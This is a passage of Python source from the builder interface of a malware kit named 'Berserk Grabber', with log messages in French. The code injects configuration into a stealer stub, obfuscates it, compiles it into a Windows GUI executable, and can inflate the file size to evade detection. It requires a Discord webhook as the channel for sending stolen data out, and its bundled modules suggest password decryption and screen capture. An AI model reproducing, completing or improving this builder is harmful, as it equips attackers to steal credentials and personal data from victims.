                "--target-name", filename,
                "--base-name", "Win32GUI",
                "--includes", "base64",
                "--includes", "binascii",
                "--includes", "concurrent.futures",
                "--includes", "csv",
                "--includes", "ctypes",
                "--includes", "json",
                "--includes", "multiprocessing",
                "--includes", "random",
                "--includes", "re",
                "--includes", "shutil",
                "--includes", "sqlite3",
                "--includes", "subprocess",
                "--includes", "sys",
                "--includes", "threading",
                "--includes", "time",
                "--includes", "winreg",
                "--includes", "zipfile",
                "--includes", "requests",
                "--includes", "requests_toolbelt",
                "--includes", "requests_toolbelt.multipart.encoder",
                "--includes", "urllib3",
                "--includes", "certifi",
                "--includes", "charset_normalizer",
                "--includes", "idna",
                "--includes", "psutil",
                "--includes", "PIL",
                "--includes", "PIL.Image",
                "--includes", "PIL.ImageGrab",
                "--includes", "Cryptodome",
                "--includes", "Cryptodome.Cipher",
                "--includes", "Cryptodome.Cipher.AES",
                "--includes", "win32crypt",
                "--includes", "cv2",
            ]
            if exeicon != "NONE":
                cmd_args += ["--icon", exeicon]
            subprocess.run(cmd_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            _log("cx_Freeze termine. Executable : " + filename + ".exe", "ok")

    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py', "./tools/upx.exe"}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    def write_and_obfuscate(self, filename):
        _log("Injection de la configuration dans le stub...", "step")
        with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
            f.write(self.get_config())
        _log("Fichier " + filename + ".py genere.", "ok")

        if self.obfuscation.get() == 1:
            _log("Obfuscation du code en cours...", "step")
            os.system(f"python ./tools/obfuscation.py ./{filename}.py")
            os.remove(f"./{filename}.py")
            os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
            _log("Obfuscation terminee.", "ok")

    def _is_webhook_valid(self):
        w = (self.webhook_button.get() or "").strip()
        if not w or w.lower() == "none":
            return False
        return w.startswith("https://discord.com/api/webhooks/") and len(w) > 50

    def buildfile(self):
        if not self._is_webhook_valid():
            messagebox.showerror("Webhook requis", "Entrez une URL de webhook Discord valide\n(https://discord.com/api/webhooks/...) puis cliquez sur \"Check Webhook\" ou vérifiez l'URL.")
            return
        self.updated_dictionary["webhook"] = self.webhook_button.get().strip()

        filename = self.return_filename()
        filetype = self.get_filetype()
        _log("", "title")
        _log("========== Berserk Grabber - Build ==========", "title")
        _log("Fichier : " + filename + (" (.py)" if filetype == "py" else " (.exe)"), "step")
        _log("", "title")

        try:
            if filetype == "py":
                self.write_and_obfuscate(filename)
                if self.pump.get() == 1:
                    _log("File pumper : ajout de " + str(self.get_mb()) + " Mo...", "step")
                    self.file_pumper(filename, "py", self.get_mb())
                    _log("Pumper termine.", "ok")
                _log("Build .py termine : " + filename + ".py", "ok")
                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)

            elif self.get_filetype() == "pyinstaller":
                self.write_and_obfuscate(filename)
                thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
                thread.start()
                self.building_button_thread(thread)
                if self.pump.get() == 1:
                    _log("File pumper : ajout de " + str(self.get_mb()) + " Mo a l'exe...", "step")
                    self.file_pumper(filename, "exe", self.get_mb())
                    _log("Pumper termine.", "ok")
                _log("Nettoyage des fichiers temporaires...", "step")
                self.cleanup_files(filename)
                _log("Build reussi : " + filename + ".exe", "ok")
                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)

            elif self.get_filetype() == "cxfreeze":
                self.write_and_obfuscate(filename)
                thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
                thread.start()
                self.building_button_thread(thread)
                if self.pump.get() == 1:
                    _log("File pumper : ajout de " + str(self.get_mb()) + " Mo a l'exe...", "step")
                    self.file_pumper(filename, "exe", self.get_mb())
                    _log("Pumper termine.", "ok")
                try:
                    if os.path.isfile(f"./{filename}.py"):
                        os.remove(f"./{filename}.py")
                except Exception:
                    pass
                _log("Build reussi : " + filename + ".exe", "ok")
                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)
        except Exception as e:
            _log("Erreur : " + str(e), "warn")
            messagebox.showerror("Erreur build", f"Une erreur s'est produite lors du build:\n{str(e)}")
            self.reset_build_button()


if __name__ == "__main__":
    app = App()
    app.mainloop()
